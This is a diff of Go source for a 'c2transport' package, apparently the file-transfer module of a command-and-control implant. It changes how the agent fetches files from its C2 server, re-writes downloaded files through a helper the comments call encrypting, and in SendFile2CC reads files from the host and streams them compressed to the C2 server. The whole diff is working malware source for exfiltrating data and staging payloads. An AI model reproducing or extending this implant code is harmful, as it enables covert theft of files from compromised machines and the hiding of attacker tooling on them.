@@ -1,7 +1,7 @@
 package c2transport
 
 import (
-	"bufio"
+	"bytes"
 	"context"
 	"fmt"
 	"io"
@@ -29,9 +29,12 @@ import (
 func FetchFile(download_addr, file_to_download, path, checksum string) (data []byte, err error) {
 	if util.IsFileExist(path) {
 		// check checksum
-		if crypto.SHA256SumFile(path) == checksum {
-			logging.Printf("FetchFile: %s already exists and checksum matches", path)
-			return
+		data, err = util.ReadFileAgent(path)
+		if err == nil {
+			if crypto.SHA256SumRaw(data) == checksum {
+				logging.Printf("FetchFile: %s already exists and checksum matches", path)
+				return
+			}
 		}
 	}
 
@@ -42,7 +45,8 @@ func FetchFile(download_addr, file_to_download, path, checksum string) (data []b
 		err = FetchFileKCP(download_addr, file_to_download, path, checksum)
 		if util.IsFileExist(path) {
 			// checksum
-			if crypto.SHA256SumFile(path) == checksum {
+			data, err = util.ReadFileAgent(path)
+			if err == nil && crypto.SHA256SumRaw(data) == checksum {
 				logging.Printf("FetchFile: %s downloaded via TCP and checksum matches", path)
 			}
 		}
@@ -136,6 +140,14 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 				resp.HTTPResponse, path)
 		}
 		os.RemoveAll(lock)
+
+		// encrypt the file
+		if util.IsExist(path) {
+			data, err = util.ReadFileAgent(path)
+			if err == nil {
+				util.WriteFileAgent(path, data, 0o600)
+			}
+		}
 	}()
 	for !resp.IsComplete() {
 		select {
@@ -146,8 +158,14 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 				logging.Print(err)
 				return
 			}
-			if checksum != crypto.SHA256SumFile(path) {
-				err = fmt.Errorf("checksum failed: %s != %s", crypto.SHA256SumFile(path), checksum)
+			// checksum of the downloaded file (plaintext)
+			fileData, readErr := util.ReadFileAgent(path)
+			if readErr != nil {
+				err = fmt.Errorf("failed to read downloaded file for checksum: %v", readErr)
+				return
+			}
+			if checksum != crypto.SHA256SumRaw(fileData) {
+				err = fmt.Errorf("checksum failed: %s != %s", crypto.SHA256SumRaw(fileData), checksum)
 				return
 			}
 			logging.Printf("saved %s to %s (%d bytes)", url, path, resp.Size())
@@ -165,19 +183,17 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	logging.Printf("Sending %s to CC, offset=%d", filepath, offset)
 	// open and read the target file
-	f, err := os.Open(filepath)
+	data, err := util.ReadFileAgent(filepath)
 	if err != nil {
 		err = fmt.Errorf("failed to open %s: %v", filepath, err)
 		return
 	}
-	defer f.Close()
 
-	// seek offset
-	_, err = f.Seek(offset, 0)
-	if err != nil {
-		err = fmt.Errorf("failed to seek %d in %s: %v", offset, filepath, err)
+	if offset > int64(len(data)) {
+		err = fmt.Errorf("offset %d > file size %d", offset, len(data))
 		return
 	}
+	data = data[offset:]
 
 	// connect
 	url := fmt.Sprintf("%s%s/%s",
@@ -200,8 +216,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	}
 	defer compressor.Close()
 
-	freader := bufio.NewReader(f)
-	n, err := io.Copy(compressor, freader)
+	n, err := io.Copy(compressor, bytes.NewReader(data))
 	if err != nil {
 		logging.Printf("failed, %d bytes transfered: %v", n, err)
 	}
